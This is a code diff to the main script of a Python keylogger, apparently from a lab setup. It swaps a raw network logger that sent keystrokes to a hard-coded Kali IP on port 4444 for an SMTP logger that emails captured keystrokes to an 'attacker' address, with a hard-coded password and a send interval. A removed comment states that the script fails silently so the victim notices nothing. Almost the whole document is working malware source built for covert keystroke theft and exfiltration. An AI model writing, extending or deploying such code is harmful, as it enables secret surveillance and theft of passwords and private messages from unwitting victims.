@@ -1,24 +1,49 @@
-from utils.logger import NetworkLogger
+from utils.logger import SMTPLogger
 from core.listener import Keystrokelistener
 import sys
+import signal
+
+# SMTP Configuration
+SMTP_SERVER = "172.16.0.5"
+SMTP_PORT = 587
+SENDER_EMAIL = "attacker@dmz.local"
+SENDER_PASSWORD = "password123"
+RECEIVER_EMAIL = "attacker@dmz.local"
+BUFFER_SIZE = 100
+SEND_INTERVAL = 60
+
+logger = None
+listener = None
+
+def signal_handler(signum, frame):
+    global logger, listener
+    if logger:
+        logger.shutdown()
+    if listener:
+        listener.stop()
+    sys.exit(0)
 
 def main():
-    # --- HARD-CODE YOUR KALI IP HERE ---
-    KALI_IP = "192.168.241.129"  # Replace with your actual Kali IP
-    KALI_PORT = 4444
+    global logger, listener
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
     try:
-        # Initialize the network logger directly
-        logger = NetworkLogger(KALI_IP, KALI_PORT)
+        logger = SMTPLogger(
+            smtp_server=SMTP_SERVER,
+            smtp_port=SMTP_PORT,
+            sender_email=SENDER_EMAIL,
+            sender_password=SENDER_PASSWORD,
+            receiver_email=RECEIVER_EMAIL,
+            buffer_size=BUFFER_SIZE,
+            send_interval=SEND_INTERVAL
+        )
         
-        # Start the listener
         listener = Keystrokelistener(on_press_callback=logger.log_keystroke)
         listener.start()
-        
-        # Keep the script running
         listener.join()
     except Exception:
-        # Silent fail: If Kali is down, the victim sees nothing
         sys.exit(0)
 
 if __name__ == "__main__":
